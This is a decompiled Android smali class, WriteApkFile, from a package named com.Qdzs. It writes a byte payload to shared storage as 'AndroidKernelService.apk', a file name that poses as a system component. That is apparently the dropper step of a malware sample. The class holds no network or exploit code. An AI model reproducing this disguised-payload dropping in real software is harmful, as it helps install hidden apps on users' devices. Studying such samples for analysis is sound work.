.class public Lcom/Qdzs/WriteApkFile;
.super Ljava/lang/Object;
.source "WriteApkFile.java"


# static fields
.field private static myLogFilePath:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .prologue
    .line 8
    const-string v0, "/mnt/sdcard/"

    sput-object v0, Lcom/Qdzs/WriteApkFile;->myLogFilePath:Ljava/lang/String;

    .line 6
    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .prologue
    .line 6
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static writeApk([C)V
    .locals 9
    .parameter "msg"

    .prologue
    .line 12
    const/4 v4, 0x0

    .line 14
    .local v4, file:Ljava/io/FileOutputStream;
    :try_start_0
    new-instance v0, Ljava/io/File;

    new-instance v7, Ljava/lang/StringBuilder;

    sget-object v8, Lcom/Qdzs/WriteApkFile;->myLogFilePath:Ljava/lang/String;

    invoke-static {v8}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v8

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v8, "AndroidKernelService.apk"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-direct {v0, v7}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 15
    .local v0, apkFile:Ljava/io/File;
    new-instance v5, Ljava/io/FileOutputStream;

    const/4 v7, 0x1

    invoke-direct {v5, v0, v7}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;Z)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 21
    .end local v4           #file:Ljava/io/FileOutputStream;
    .local v5, file:Ljava/io/FileOutputStream;
    :try_start_1
    array-length v7, p0

    new-array v1, v7, [B

    .line 22
    .local v1, b:[B
    const/4 v6, 0x0

    .local v6, i:I
    :goto_0
    array-length v7, p0

    if-lt v6, v7, :cond_0

    .line 27
    const/4 v7, 0x0

    array-length v8, p0

    invoke-virtual {v5, v1, v7, v8}, Ljava/io/FileOutputStream;->write([BII)V

    move-object v4, v5

    .line 32
    .end local v0           #apkFile:Ljava/io/File;
    .end local v1           #b:[B
    .end local v5           #file:Ljava/io/FileOutputStream;
    .end local v6           #i:I
    .restart local v4       #file:Ljava/io/FileOutputStream;
    :goto_1
    return-void

    .line 24
    .end local v4           #file:Ljava/io/FileOutputStream;
    .restart local v0       #apkFile:Ljava/io/File;
    .restart local v1       #b:[B
    .restart local v5       #file:Ljava/io/FileOutputStream;
    .restart local v6       #i:I
    :cond_0
    aget-char v7, p0, v6

    int-to-byte v2, v7

    .line 25
    .local v2, b1:B
    aput-byte v2, v1, v6
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 22
    add-int/lit8 v6, v6, 0x1

    goto :goto_0

    .line 28
    .end local v0           #apkFile:Ljava/io/File;
    .end local v1           #b:[B
    .end local v2           #b1:B
    .end local v5           #file:Ljava/io/FileOutputStream;
    .end local v6           #i:I
    .restart local v4       #file:Ljava/io/FileOutputStream;
    :catch_0
    move-exception v3

    .line 30
    .local v3, e:Ljava/lang/Exception;
    :goto_2
    invoke-virtual {v3}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_1

    .line 28
    .end local v3           #e:Ljava/lang/Exception;
    .end local v4           #file:Ljava/io/FileOutputStream;
    .restart local v0       #apkFile:Ljava/io/File;
    .restart local v5       #file:Ljava/io/FileOutputStream;
    :catch_1
    move-exception v3

    move-object v4, v5

    .end local v5           #file:Ljava/io/FileOutputStream;
    .restart local v4       #file:Ljava/io/FileOutputStream;
    goto :goto_2
.end method
